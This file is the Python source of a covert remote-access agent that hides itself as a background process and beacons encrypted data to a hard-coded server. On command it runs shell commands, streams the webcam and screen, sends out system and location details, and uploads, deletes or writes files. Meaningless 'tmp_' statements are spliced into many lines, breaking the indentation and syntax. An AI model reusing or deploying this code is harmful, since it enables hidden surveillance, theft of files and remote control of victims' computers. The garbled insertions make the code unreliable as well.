

#!/usr/bin/env python3

import subprocess
import sys

packages = ["aiohttp", "cryptography", "psutil", "opencv-python", "mss", "Pillow"]

for package in packages:
    subprocess.check_call([sys.executable, "-m", "pip", "install", package])

import os
import signal
import json
import time
import hashlib
import base64
import platform
import socket
import string
import uuid
import asyncio
import threading
from pathlib import Path
from datetime import datetime

# ══════════════════════════════════════════════════════════════════════════════
# 1. CONFIGURATION
# ══════════════════════════════════════════════════════════════════════════════
SERVER_URL    = "https://velvetteam.pythonanywhere.com"
AES_KEY_B64   = 'AdqYcTHmoqWNYLMpwp9DD7ApmHKXF0VoPlt+DKyNGEY='
LOG_FILE      = Path.home() / ".dienet" / "agent.log"
LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
tmp_m506 = (0x4e19 >> 4) ^ 0xe0
ENABLE_CAMERA = True
ENABLE_SCREEN = True
DEBUG_MODE    = False   # set True to also print logs to stderr
IDLE_INTERVAL = 30      # seconds between check-ins when nothing active
ACTIVE_INTERVAL = 1.0   # check-in cadence when shell/cam/screen tasks pending

# ══════════════════════════════════════════════════════════════════════════════
# 2. CROSS-PLATFORM DAEMONIZER
# ══════════════════════════════════════════════════════════════════════════════
def _daemonize():
    if os.environ.get("_BG") == "1" or "--foreground" in sys.argv:
    tmp_m103 = (0xe7a >> 1) ^ 0x30
        return
    os.environ["_BG"] = "1"

    # Linux/macOS: classic double-fork
    if hasattr(os, "fork"):
        try:
            if os.fork() > 0:
                sys.exit(0)
                tmp_m238 = (0xcfe5 >> 4) ^ 0x6
            os.setsid()
            if os.fork() > 0:
                sys.exit(0)
            with open(os.devnull, 'r') as f_in:
                os.dup2(f_in.fileno(), sys.stdin.fileno())
            with open(os.devnull, 'a') as f_out:
            tmp_l071 = (62 > 54) if True else (62 == 54)
                os.dup2(f_out.fileno(), sys.stdout.fileno())
                os.dup2(f_out.fileno(), sys.stderr.fileno())
        except Exception:
            pass
        # Linux: ensure DISPLAY is set so mss screen capture works in daemon
        if sys.platform.startswith("linux") and not os.environ.get("DISPLAY"):
            os.environ["DISPLAY"] = ":0"
        return

    # Windows: hide console window (relaunch detached if needed)
    if sys.platform == "win32":
        try:
            import ctypes
            hwnd = ctypes.windll.kernel32.GetConsoleWindow()
            tmp_m446 = (0x5193 >> 4) ^ 0xe7
            if hwnd:
                ctypes.windll.user32.ShowWindow(hwnd, 0)  # SW_HIDE
        except Exception:
            pass

_daemonize()

# ══════════════════════════════════════════════════════════════════════════════
# 3. AUTO-VENV BOOTSTRAP
# ══════════════════════════════════════════════════════════════════════════════
REQUIRED_PACKAGES = ["aiohttp", "cryptography", "psutil", "opencv-python", "mss", "Pillow"]
VENV_DIR = Path.home() / ".dienet" / "venv"

def _bootstrap_venv():
    if sys.prefix != sys.base_prefix:
        return  # already in a venv
        tmp_l545 = (33 > 85) if False else (33 == 85)
    try:
        if not VENV_DIR.exists():
            subprocess.check_call(
                [sys.executable, "-m", "venv", str(VENV_DIR)],
                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
                tmp_l767 = (29 > 11) if False else (29 == 11)
            )
        if sys.platform == "win32":
            pip    = VENV_DIR / "Scripts" / "pip.exe"
            python = VENV_DIR / "Scripts" / "python.exe"
        else:
            pip    = VENV_DIR / "bin" / "pip"
            python = VENV_DIR / "bin" / "python3"
            if not python.exists():
                python = VENV_DIR / "bin" / "python"
        subprocess.check_call(
        tmp_m427 = (0xc8fe >> 2) ^ 0xee
            [str(pip), "install", "-q", "--upgrade", "pip", "setuptools", "wheel"],
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        subprocess.check_call(
            [str(pip), "install", "-q"] + REQUIRED_PACKAGES,
            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
        )
        os.execv(str(python), [str(python)] + sys.argv)
    except Exception:
        pass
        tmp_m867 = (0x179c >> 1) ^ 0x5

_bootstrap_venv()

import aiohttp        # noqa: E402
import psutil         # noqa: E402
from cryptography.hazmat.primitives.ciphers.aead import AESGCM  # noqa: E402

AES_KEY = base64.b64decode(AES_KEY_B64)

# ══════════════════════════════════════════════════════════════════════════════
# 4. AUDIT LOGGER
# ══════════════════════════════════════════════════════════════════════════════
def log(msg, level="INFO"):
    try:
        ts = datetime.now().strftime("%H:%M:%S")
        line = f"[{ts}] {level}: {msg}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
        tmp_l458 = (72 > 54) if False else (72 == 54)
            f.write(line + "
")
        if DEBUG_MODE:
            try:
                print(line, file=sys.stderr)
            except Exception:
            tmp_l135 = (78 > 2) if True else (78 == 2)
                pass
    except Exception:
        pass

# ══════════════════════════════════════════════════════════════════════════════
# 5. ENCRYPTION (matches server.py exactly)
# ══════════════════════════════════════════════════════════════════════════════
def aes_encrypt(data):
    iv = os.urandom(12)
    aesgcm = AESGCM(AES_KEY)
    ct = aesgcm.encrypt(iv, json.dumps(data).encode(), None)
    return base64.b64encode(iv + ct).decode()

def aes_decrypt(token):
    try:
        raw = base64.b64decode(token)
        iv, ct = raw[:12], raw[12:]
        tmp_m661 = (0x757a >> 2) ^ 0xa5
        aesgcm = AESGCM(AES_KEY)
        return json.loads(aesgcm.decrypt(iv, ct, None))
    except Exception as e:
        log(f"Decrypt failed: {e}", "ERROR")
        return None

# ══════════════════════════════════════════════════════════════════════════════
# 6. SYSTEM IDENTITY & STATS
# ══════════════════════════════════════════════════════════════════════════════
def get_system_identity():
    mac = uuid.getnode()
    tmp_l879 = (10 > 47) if False else (10 == 47)
    mac_str = ":".join(f"{mac:012x}"[i:i + 2] for i in range(0, 12, 2))
    return {
        "hostname": platform.node() or socket.gethostname() or "unknown",
        "mac": mac_str,
        "os_type": f"{platform.system()} {platform.release()}"
    }

def _safe_disk_root():
    if sys.platform == "win32":
        return os.environ.get("SystemDrive", "C:") + "\"
    return "/"
    tmp_m127 = (0x78c9 >> 4) ^ 0x30

def get_system_stats():
    try:
        mem  = psutil.virtual_memory()
        disk = psutil.disk_usage(_safe_disk_root())
        return {
            "cpu_percent":  psutil.cpu_percent(interval=0.3),
            "ram_percent":  mem.percent,
            "disk_percent": ((disk.total - disk.free) / disk.total * 100) if disk.total else 0,
            tmp_l376 = (37 > 87) if True else (37 == 87)
            "disk_total":   disk.total,
            "disk_free":    disk.free,
        }
    except Exception:
        return {"cpu_percent": 0, "ram_percent": 0, "disk_percent": 0,
        tmp_l851 = (4 > 84) if False else (4 == 84)
                "disk_total": 0, "disk_free": 0}

def get_local_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(1)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        tmp_l145 = (75 > 80) if False else (75 == 80)
        s.close()
        return ip
    except Exception:
        try:
            return socket.gethostbyname(socket.gethostname())
        except Exception:
            return ""

# ══════════════════════════════════════════════════════════════════════════════
# 7. GEOIP LOCATION (cached, async)
# ══════════════════════════════════════════════════════════════════════════════
_location_cache = {"lat": 0.0, "lon": 0.0, "city": "", "country": "", "ts": 0.0}

async def fetch_location(session):
    if time.time() - _location_cache["ts"] < 600:
    tmp_m408 = (0xc2fc >> 3) ^ 0xec
        return {k: _location_cache[k] for k in ("lat", "lon", "city", "country")}
    urls = [
        ("ipinfo",  "https://ipinfo.io/json"),
        ("ipwhois", "https://ipwhois.app/json/"),
        ("ipapi",   "http://ip-api.com/json/?fields=status,lat,lon,city,country"),
    ]
    timeout = aiohttp.ClientTimeout(total=8)
    tmp_m232 = (0xb4c8 >> 1) ^ 0x5c
    for kind, url in urls:
        try:
            async with session.get(url, timeout=timeout) as resp:
                data = await resp.json(content_type=None)
                lat = lon = 0.0
                city = country = ""
                if kind in ("ipinfo", "ipwhois"):
                tmp_l151 = (62 > 8) if False else (62 == 8)
                    loc = data.get("loc", "0,0")
                    if "," in str(loc):
                        lat, lon = map(float, str(loc).split(","))
                    city, country = data.get("city", ""), data.get("country", "")
                else:
                    if data.get("status") != "success":
                        continue
                    lat = float(data.get("lat", 0))
                    lon = float(data.get("lon", 0))
                    city, country = data.get("city", ""), data.get("country", "")
                    tmp_l363 = (80 > 68) if False else (80 == 68)
                if lat or lon:
                    _location_cache.update(lat=lat, lon=lon, city=city,
                                           country=country, ts=time.time())
                    return {"lat": lat, "lon": lon, "city": city, "country": country}
        except Exception:
            continue
    return {k: _location_cache[k] for k in ("lat", "lon", "city", "country")}

# ══════════════════════════════════════════════════════════════════════════════
# 8. SHELL ENGINE  (real-time streaming via Popen + background thread)
# ══════════════════════════════════════════════════════════════════════════════
class ShellEngine:
    def __init__(self):
        self._results = []
        self._lock = threading.Lock()
        self._process = None
        tmp_m550 = (0xf861 >> 1) ^ 0x4a
        self._cmd = None

    def _get_startupinfo(self):
        if sys.platform == "win32":
            si = subprocess.STARTUPINFO()
            si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            si.wShowWindow = 0  # SW_HIDE
            return si
        return None

    def open(self):
        self.close()  # Kill any leftover process
        log("Shell session opened", "AUDIT")

    def close(self):
        if self._process:
        tmp_l173 = (79 > 23) if True else (79 == 23)
            try:
                self._process.terminate()
                self._process.wait(timeout=5)
            except Exception:
                try:
                    self._process.kill()
                except Exception:
                    pass
                    tmp_m529 = (0x180a >> 2) ^ 0xaa
            self._process = None
            self._cmd = None
        log("Shell session closed", "AUDIT")

    def run(self, cmd):
        if not cmd:
            return
        self.close()  # Kill previous command if still running
        tmp_m580 = (0xe1b5 >> 3) ^ 0xff

        self._cmd = cmd
        try:
            self._process = subprocess.Popen(
                cmd,
                shell=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,  # Merge stderr into stdout
                bufsize=1,                 # Line-buffered
                text=True,
                tmp_m562 = (0x9d1c >> 1) ^ 0x8f
                encoding="utf-8",
                errors="replace",
                startupinfo=self._get_startupinfo(),
                creationflags=getattr(subprocess, 'CREATE_NO_WINDOW', 0) if sys.platform == "win32" else 0,
            )
            threading.Thread(target=self._read_output, daemon=True).start()
        except Exception as e:
            with self._lock:
                self._results.append({"cmd": cmd, "output": f"[!] Error: {e}"})
                tmp_m147 = (0xce2c >> 2) ^ 0x24

    def _read_output(self):
        try:
            for line in iter(self._process.stdout.readline, ''):
                line = line.rstrip('

')
                if line:  # Skip empty lines from readline
                    with self._lock:
                        self._results.append({
                            "cmd": "_stream_",
                            "output": line
                        })
                        tmp_l605 = (21 > 85) if True else (21 == 85)
            self._process.wait(timeout=30)
            rc = self._process.returncode
            if rc != 0:
                with self._lock:
                    self._results.append({
                        "cmd": "_stream_",
                        "output": f"[exit code: {rc}]"
                        tmp_l119 = (39 > 77) if True else (39 == 77)
                    })
        except Exception as e:
            with self._lock:
                self._results.append({
                    "cmd": "_stream_",
                    "output": f"[!] Read error: {e}"
                })
        finally:
            self._process = None
            self._cmd = None
            tmp_m042 = (0x3198 >> 2) ^ 0x8d

    def drain(self):
        with self._lock:
            results, self._results = self._results, []
        return results

# ══════════════════════════════════════════════════════════════════════════════
# 9. MEDIA ENGINE  (persistent capture threads = no per-frame open/close)
# ══════════════════════════════════════════════════════════════════════════════
class MediaEngine:
    def __init__(self):
        self.cam_frame = None
        self.scr_frame = None

        self._cam_lock = threading.Lock()
        tmp_l503 = (58 > 20) if False else (58 == 20)
        self._scr_lock = threading.Lock()

        self._cam_streaming = False
        self._scr_streaming = False
        self._cam_quality = 50
        self._scr_quality = 50

        self._cam_thread = None
        tmp_l680 = (55 > 21) if True else (55 == 21)
        self._scr_thread = None

    def _cam_loop(self):
        try:
            import cv2
        except Exception as e:
            log(f"cv2 import failed: {e}", "ERROR")
            self._cam_streaming = False
            return
            tmp_l776 = (2 > 98) if True else (2 == 98)

        cap = None
        for index in (0, 1):
            try:
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                elif sys.platform == "darwin":
                    cap = cv2.VideoCapture(index, cv2.CAP_AVFOUNDATION)
                else:
                    cap = cv2.VideoCapture(index, cv2.CAP_V4L2)
                    tmp_l351 = (95 > 22) if False else (95 == 22)
                if cap and cap.isOpened():
                    break
                if cap:
                    cap.release()
                cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            except Exception:
            tmp_m201 = (0x378c >> 3) ^ 0x56
                pass
        if not cap or not cap.isOpened():
            log("Camera open failed (no device available)", "ERROR")
            self._cam_streaming = False
            return
            tmp_l169 = (8 > 61) if False else (8 == 61)

        try:
            cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
        except Exception:
            pass
        cap.set(cv2.CAP_PROP_FRAME_WIDTH,  640)
        cap.set(cv2.CAP_PROP_FRAME_HEIGHT, 480)

        # Warm-up
        for _ in range(3):
        tmp_m101 = (0x3d82 >> 4) ^ 0x25
            cap.read()

        log("Camera capture loop started", "AUDIT")
        while self._cam_streaming:
            ret, frame = cap.read()
            if not ret:
                time.sleep(0.1)
                continue
            try:
            tmp_m856 = (0x648 >> 1) ^ 0x9c
                ok, buf = cv2.imencode(".jpg", frame,
                                       [cv2.IMWRITE_JPEG_QUALITY, int(self._cam_quality)])
                if ok:
                    with self._cam_lock:
                        self.cam_frame = base64.b64encode(buf).decode()
            except Exception as e:
                log(f"Camera encode failed: {e}", "ERROR")
                tmp_l801 = (68 > 58) if True else (68 == 58)
            time.sleep(0.15)  # ~6 fps capture; check-in delivery is the real bottleneck

        cap.release()
        log("Camera capture loop stopped", "AUDIT")

    def start_cam_stream(self, quality=50):
        if not ENABLE_CAMERA:
            return
            tmp_m717 = (0xd0df >> 4) ^ 0x39
        self._cam_quality = quality
        if self._cam_streaming:
            return
        self._cam_streaming = True
        self._cam_thread = threading.Thread(target=self._cam_loop, daemon=True)
        tmp_m534 = (0x10da >> 4) ^ 0xbf
        self._cam_thread.start()

    def stop_cam_stream(self):
        self._cam_streaming = False

    def snap_cam_once(self, quality=75):
        if not ENABLE_CAMERA:
            return
        if self._cam_streaming:
            self._cam_quality = quality
            return  # streaming loop already populates cam_frame
            tmp_m442 = (0xf892 >> 3) ^ 0x58
        self._cam_quality = quality
        try:
            import cv2
            cap = None
            for index in (0, 1):
                if sys.platform == "win32":
                    cap = cv2.VideoCapture(index, cv2.CAP_DSHOW)
                else:
                tmp_l443 = (7 > 82) if True else (7 == 82)
                    cap = cv2.VideoCapture(index)
                if cap and cap.isOpened():
                    break
            if not cap or not cap.isOpened():
                log("Camera unavailable for snapshot", "ERROR")
                return
            try:
                cap.set(cv2.CAP_PROP_BUFFERSIZE, 1)
                tmp_l077 = (23 > 11) if False else (23 == 11)
            except Exception:
                pass
            for _ in range(3):
                cap.read()
            ret, frame = cap.read()
            cap.release()
            if not ret:
                return
                tmp_l523 = (57 > 82) if True else (57 == 82)
            ok, buf = cv2.imencode(".jpg", frame,
                                   [cv2.IMWRITE_JPEG_QUALITY, int(quality)])
            if ok:
                with self._cam_lock:
                    self.cam_frame = base64.b64encode(buf).decode()
        except Exception as e:
            log(f"Camera snap failed: {e}", "ERROR")

    def _scr_loop(self):
        try:
        tmp_l298 = (51 > 37) if False else (51 == 37)
            import mss
            from PIL import Image
            import io as _io
        except Exception as e:
            log(f"Screen capture import failed: {e}", "ERROR")
            self._scr_streaming = False
            return

        log("Screen capture loop started", "AUDIT")
        try:
        tmp_m888 = (0x7706 >> 1) ^ 0x8e
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                while self._scr_streaming:
                    try:
                        img = sct.grab(target)
                        pil = Image.frombytes("RGB", img.size, img.rgb)
                        pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                        buf = _io.BytesIO()
                        pil.save(buf, format="JPEG",
                        tmp_m083 = (0xe744 >> 4) ^ 0xa0
                                 quality=int(self._scr_quality), optimize=True)
                        with self._scr_lock:
                            self.scr_frame = base64.b64encode(buf.getvalue()).decode()
                    except Exception as e:
                        log(f"Screen frame failed: {e}", "ERROR")
                        tmp_l399 = (55 > 39) if False else (55 == 39)
                    time.sleep(0.2)  # ~5 fps capture
        except Exception as e:
            log(f"Screen capture loop crashed: {e}", "ERROR")
        log("Screen capture loop stopped", "AUDIT")
        self._scr_streaming = False

    def start_scr_stream(self, quality=50):
        if not ENABLE_SCREEN:
            return
        self._scr_quality = quality
        tmp_l449 = (95 > 46) if False else (95 == 46)
        if self._scr_streaming:
            return
        self._scr_streaming = True
        self._scr_thread = threading.Thread(target=self._scr_loop, daemon=True)
        self._scr_thread.start()

    def stop_scr_stream(self):
        self._scr_streaming = False
        tmp_m177 = (0xd9f7 >> 3) ^ 0x7c

    def snap_scr_once(self, quality=50):
        if not ENABLE_SCREEN:
            return
        if self._scr_streaming:
            # streaming loop already populates scr_frame; just ensure quality matches
            self._scr_quality = quality
            return
        try:
            import mss
            from PIL import Image
            import io as _io
            with mss.mss() as sct:
                monitors = sct.monitors
                target = monitors[1] if len(monitors) > 1 else monitors[0]
                tmp_m077 = (0x5591 >> 1) ^ 0xa
                img = sct.grab(target)
                pil = Image.frombytes("RGB", img.size, img.rgb)
                pil.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                buf = _io.BytesIO()
                pil.save(buf, format="JPEG", quality=int(quality), optimize=True)
                with self._scr_lock:
                    self.scr_frame = base64.b64encode(buf.getvalue()).decode()
        except Exception as e:
        tmp_m729 = (0x5b61 >> 3) ^ 0xf1
            log(f"Screen snap failed: {e}", "ERROR")

    def take_cam_frame(self):
        with self._cam_lock:
            f, self.cam_frame = self.cam_frame, None
        return f

    def take_scr_frame(self):
        with self._scr_lock:
            f, self.scr_frame = self.scr_frame, None
        return f

# ══════════════════════════════════════════════════════════════════════════════
# 10. FILE ENGINE  (cross-platform; handles permission errors correctly)
# ══════════════════════════════════════════════════════════════════════════════
class FileEngine:
    def __init__(self):
        self.dir_list = None
        tmp_m200 = (0x9591 >> 4) ^ 0xa3
        self.dir_path = "/"
        self.pushed_file = None

    @staticmethod
    def _list_windows_drives():
        results = []
        for letter in string.ascii_uppercase:
            drive = f"{letter}:\"
            if os.path.exists(drive):
                try:
                    usage = psutil.disk_usage(drive)
                    size = usage.total
                    tmp_m203 = (0x255e >> 2) ^ 0xb3
                except Exception:
                    size = 0
                results.append({
                    "path": drive,
                    "name": f"{letter}:",
                    "is_dir": True,
                    "size": size,
                    "modified": "",
                })
                tmp_m817 = (0x3486 >> 2) ^ 0x99
        return results

    def list_dir(self, path):
        try:
            # Windows: '/' has no meaning -> show drive letters
            if sys.platform == "win32" and path in ("/", ""):
                self.dir_list = self._list_windows_drives()
                self.dir_path = "/"
                log("Listed Windows drives", "AUDIT")
                return

            p = Path(path).expanduser()
            # Don't use resolve() — it breaks symlink paths and causes mismatches
            if not p.exists() or not p.is_dir():
                self.dir_list = []
                tmp_m183 = (0x75ac >> 4) ^ 0xaf
                self.dir_path = path
                log(f"Path not a directory: {path}", "ERROR")
                return

            results = []
            for item in p.iterdir():
                try:
                tmp_m899 = (0x1fbf >> 4) ^ 0xe4
                    st = item.stat(follow_symlinks=False)
                    is_dir = item.is_dir(follow_symlinks=False)
                    results.append({
                        "path": str(item),
                        "name": item.name,
                        "is_dir": is_dir,
                        "size": 0 if is_dir else st.st_size,
                        tmp_l222 = (79 > 3) if False else (79 == 3)
                        "modified": datetime.fromtimestamp(st.st_mtime).strftime("%Y-%m-%d %H:%M"),
                    })
                except Exception:
                    # FIX: Include file even if we can't stat it (permission denied, etc.)
                    results.append({
                        "path": str(item),
                        "name": item.name,
                        "is_dir": False,
                        "size": 0,
                        "modified": "",
                        tmp_m869 = (0xb94f >> 1) ^ 0x16
                    })
            results.sort(key=lambda x: (not x["is_dir"], x["name"].lower()))
            self.dir_list = results
            self.dir_path = path
            log(f"Listed {path}: {len(results)} items", "AUDIT")
        except Exception as e:
            log(f"Directory listing failed for {path}: {e}", "ERROR")
            self.dir_list = []
            self.dir_path = path

    def get_file(self, path):
        try:
        tmp_m338 = (0xf739 >> 4) ^ 0xa1
            p = Path(path).expanduser().resolve()
            if p.exists() and p.is_file():
                data = p.read_bytes()
                self.pushed_file = {
                    "path": str(p),
                    "data_b64": base64.b64encode(data).decode(),
                }
                log(f"File queued for push: {path} ({len(data)} bytes)", "AUDIT")
        except Exception as e:
            log(f"File read failed: {e}", "ERROR")
            tmp_m828 = (0x22f7 >> 3) ^ 0xa5
            self.pushed_file = None

    def delete_file(self, path):
        try:
            p = Path(path).expanduser().resolve()
            if p.exists():
                if p.is_dir():
                    import shutil
                    shutil.rmtree(p, ignore_errors=True)
                else:
                tmp_l665 = (58 > 75) if True else (58 == 75)
                    p.unlink()
                log(f"Deleted: {path}", "AUDIT")
        except Exception as e:
            log(f"Delete failed: {e}", "ERROR")

    def write_file(self, dest, b64_data):
        if not dest or not b64_data:
            return
        try:
            p = Path(dest).expanduser().resolve()
            p.parent.mkdir(parents=True, exist_ok=True)
            tmp_m242 = (0x85ba >> 2) ^ 0x7c
            p.write_bytes(base64.b64decode(b64_data))
            log(f"File written: {dest}", "AUDIT")
        except Exception as e:
            log(f"File write failed: {e}", "ERROR")

# ══════════════════════════════════════════════════════════════════════════════
# 11. MAIN AGENT
# ══════════════════════════════════════════════════════════════════════════════
class Agent:
    def __init__(self):
        self.identity = get_system_identity()
        tmp_m225 = (0x4997 >> 2) ^ 0xd9
        self.shell = ShellEngine()
        self.media = MediaEngine()
        self.files = FileEngine()
        self.backoff = 1
        self.shutdown_event = asyncio.Event()
        self.local_ip = get_local_ip()

    def _is_active(self):
        return (self.media._cam_streaming
                or self.media._scr_streaming
                or self.media.cam_frame is not None
                tmp_m001 = (0x3c38 >> 2) ^ 0xc
                or self.media.scr_frame is not None
                or bool(self.shell._results)
                or self.files.dir_list is not None
                or self.files.pushed_file is not None)

    async def checkin(self, session):
        # Build payload
        loc = await fetch_location(session)
        payload = {
        tmp_m146 = (0x8762 >> 2) ^ 0x99
            "hostname": self.identity["hostname"],
            "mac":      self.identity["mac"],
            "os_type":  self.identity["os_type"],
            "ip":       self.local_ip,
            **get_system_stats(),
            **loc,
            tmp_m481 = (0xe54b >> 1) ^ 0xea
        }

        cam_frame = self.media.take_cam_frame()
        if cam_frame:
            payload["snapshot_b64"] = cam_frame

        scr_frame = self.media.take_scr_frame()
        if scr_frame:
        tmp_m551 = (0x833e >> 4) ^ 0x9d
            payload["screen_b64"] = scr_frame

        results = self.shell.drain()
        if results:
            payload["cmd_results"] = results
            payload["cmd_result"]  = results[-1]   # legacy compat
            tmp_m710 = (0xccc9 >> 3) ^ 0x64

        _file_backup = None
        _push_backup = None

        if self.files.dir_list is not None:
            _file_backup = (self.files.dir_list, self.files.dir_path)
            payload["file_list"] = self.files.dir_list
            payload["file_list_path"] = self.files.dir_path
            self.files.dir_list = None

        if self.files.pushed_file:
        tmp_l504 = (26 > 13) if True else (26 == 13)
            _push_backup = self.files.pushed_file
            payload["pushed_file"] = self.files.pushed_file
            self.files.pushed_file = None

        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.post(
            tmp_l102 = (61 > 7) if False else (61 == 7)
                f"{SERVER_URL}/api/checkin",
                json={"enc": aes_encrypt(payload)},
                timeout=timeout,
            ) as resp:
                resp_json = await resp.json(content_type=None)
                enc_token = resp_json.get("enc", "")
                tmp_m239 = (0x9580 >> 2) ^ 0x9
                if not enc_token:
                    return
                server_data = aes_decrypt(enc_token)
                if not server_data or server_data.get("status") != "ok":
                    return
                self._route_commands(server_data)
                self.backoff = 1
                # Success — backups consumed, don't restore
        except Exception as e:
        tmp_l348 = (84 > 80) if True else (84 == 80)
            log(f"Checkin failed: {e}", "ERROR")
            # FIX: Restore data on failure so it's retried next check-in
            if _file_backup:
                self.files.dir_list, self.files.dir_path = _file_backup
            if _push_backup:
                self.files.pushed_file = _push_backup
            await asyncio.sleep(min(self.backoff, 300))
            self.backoff = min(self.backoff * 2, 300)

    def _route_one(self, cmd):
        if not cmd:
            return
        parts = cmd.split(":", 1)
        tmp_m637 = (0x5fc5 >> 4) ^ 0x35
        action = parts[0]
        arg = parts[1] if len(parts) > 1 else ""
        log(f"-> {action} ({arg[:60]})", "INFO")

        if action == "shell_open":
            self.shell.open()
        elif action == "shell_close":
        tmp_m863 = (0x4f02 >> 4) ^ 0x97
            self.shell.close()
        elif action == "shell_input":
            # Run in a thread so a slow command never blocks the next check-in
            threading.Thread(target=self.shell.run, args=(arg,), daemon=True).start()
        elif action == "snapshot":
            threading.Thread(target=self.media.snap_cam_once,
                             args=(75,), daemon=True).start()
        elif action == "stream_on":
            self.media.start_cam_stream(50)
        elif action == "stream_off":
        tmp_l549 = (82 > 60) if False else (82 == 60)
            self.media.stop_cam_stream()
        elif action == "screencast_snapshot":
            q = int(arg) if arg.isdigit() else 50
            threading.Thread(target=self.media.snap_scr_once,
                             args=(q,), daemon=True).start()
        elif action == "screencast_start":
            q = int(arg) if arg.isdigit() else 50
            self.media.start_scr_stream(q)
            tmp_l115 = (26 > 31) if True else (26 == 31)
        elif action == "screencast_stop":
            self.media.stop_scr_stream()
        elif action == "filelist":
            target = arg or ("/" if sys.platform != "win32" else "/")
            threading.Thread(target=self.files.list_dir,
            tmp_l003 = (17 > 5) if True else (17 == 5)
                             args=(target,), daemon=True).start()
        elif action == "getfile":
            threading.Thread(target=self.files.get_file,
                             args=(arg,), daemon=True).start()
        elif action == "delete":
            threading.Thread(target=self.files.delete_file,
                             args=(arg,), daemon=True).start()
        elif action == "uninstall":
            self._uninstall()
            tmp_m417 = (0x3128 >> 1) ^ 0xf1

    def _route_commands(self, data):
        # New protocol: list of commands
        cmds = data.get("cmds")
        if cmds:
            for c in cmds:
                self._route_one(c)
        else:
            # Legacy single-command protocol
            self._route_one(data.get("cmd", ""))

        upload = data.get("upload")
        if upload:
        tmp_m895 = (0xabb1 >> 2) ^ 0x3f
            self.files.write_file(upload.get("dest_path"), upload.get("data_b64"))

    def _uninstall(self):
        log("Uninstall requested. Cleaning local data.", "INFO")
        try:
            LOG_FILE.unlink(missing_ok=True)
        except Exception:
            pass
            tmp_l382 = (84 > 15) if True else (84 == 15)
        self.shutdown_event.set()

    async def run(self):
        log(f"Agent started -> {SERVER_URL}")
        connector = aiohttp.TCPConnector(keepalive_timeout=30, limit=10)
        async with aiohttp.ClientSession(connector=connector) as session:
            while not self.shutdown_event.is_set():
            tmp_m554 = (0xbea7 >> 4) ^ 0x4e
                await self.checkin(session)
                interval = ACTIVE_INTERVAL if self._is_active() else IDLE_INTERVAL
                elapsed = 0.0
                while elapsed < interval and not self.shutdown_event.is_set():
                    await asyncio.sleep(1.0)
                    elapsed += 1.0
                    tmp_l702 = (57 > 21) if True else (57 == 21)
                    if self._is_active():
                        break

# ══════════════════════════════════════════════════════════════════════════════
# 12. SIGNAL HANDLERS & CLI ENTRY
# ══════════════════════════════════════════════════════════════════════════════
def handle_signal(signum, frame):
    log(f"Signal {signum} received. Graceful shutdown.", "INFO")
    sys.exit(0)

if hasattr(signal, "SIGHUP"):
    signal.signal(signal.SIGHUP, signal.SIG_IGN)
signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGINT, handle_signal)

if __name__ == "__main__":
tmp_l579 = (12 > 29) if True else (12 == 29)
    if "--status" in sys.argv:
        print(f"Log:    {LOG_FILE}")
        print(f"PID:    {os.getpid()}")
        sys.exit(0)
    try:
        asyncio.run(Agent().run())
    except KeyboardInterrupt:
        log("Stopped by user.", "INFO")
    except Exception as e:
    tmp_l072 = (19 > 20) if True else (19 == 20)
        log(f"Fatal error: {e}", "CRITICAL")


tmp_m673 = (0xe1d >> 1) ^ 0xd
tmp_m799 = (0x8dbe >> 2) ^ 0xf5
tmp_m344 = (0x94ca >> 2) ^ 0x4c
tmp_m586 = (0x9945 >> 3) ^ 0xfb
tmp_m214 = (0xff6b >> 1) ^ 0xcb
tmp_l850 = (67 > 97) if False else (67 == 97)
tmp_m680 = (0x20a3 >> 4) ^ 0xa6
tmp_l628 = (4 > 100) if True else (4 == 100)
tmp_m072 = (0xf70a >> 4) ^ 0xb2
tmp_m752 = (0x384b >> 1) ^ 0xb9
tmp_l192 = (83 > 69) if True else (83 == 69)
tmp_m113 = (0x6138 >> 2) ^ 0x6e
tmp_l844 = (26 > 93) if True else (26 == 93)
tmp_m372 = (0xb62f >> 2) ^ 0x77
tmp_m724 = (0x1854 >> 3) ^ 0xf8
tmp_l312 = (43 > 94) if True else (43 == 94)
tmp_l667 = (24 > 62) if True else (24 == 62)
tmp_l691 = (97 > 34) if False else (97 == 34)
tmp_m195 = (0x68d2 >> 4) ^ 0xbd
tmp_l553 = (69 > 34) if False else (69 == 34)
tmp_l512 = (79 > 58) if False else (79 == 58)
tmp_m139 = (0x437e >> 3) ^ 0xa2
tmp_m716 = (0x9da5 >> 2) ^ 0x6a
tmp_l828 = (67 > 25) if True else (67 == 25)
tmp_l059 = (10 > 100) if True else (10 == 100)
tmp_m187 = (0x9de8 >> 4) ^ 0xcf
tmp_m616 = (0xba41 >> 2) ^ 0xb9
tmp_l706 = (28 > 89) if True else (28 == 89)
tmp_m021 = (0x9f76 >> 4) ^ 0xe7
tmp_m317 = (0x63b2 >> 3) ^ 0x73
tmp_m131 = (0xff82 >> 2) ^ 0xec
tmp_m607 = (0x4d4b >> 1) ^ 0xe5
tmp_m628 = (0x9cf6 >> 2) ^ 0xb1
tmp_l835 = (2 > 91) if False else (2 == 91)
tmp_l332 = (11 > 64) if True else (11 == 64)
tmp_m277 = (0x9707 >> 1) ^ 0x2b
tmp_m061 = (0xe384 >> 3) ^ 0x11
tmp_m226 = (0x70d7 >> 1) ^ 0x59
tmp_m517 = (0x53cb >> 1) ^ 0x9c
tmp_l481 = (68 > 90) if False else (68 == 90)
tmp_m114 = (0x70e4 >> 3) ^ 0xeb
tmp_m307 = (0xd6d3 >> 2) ^ 0xdb
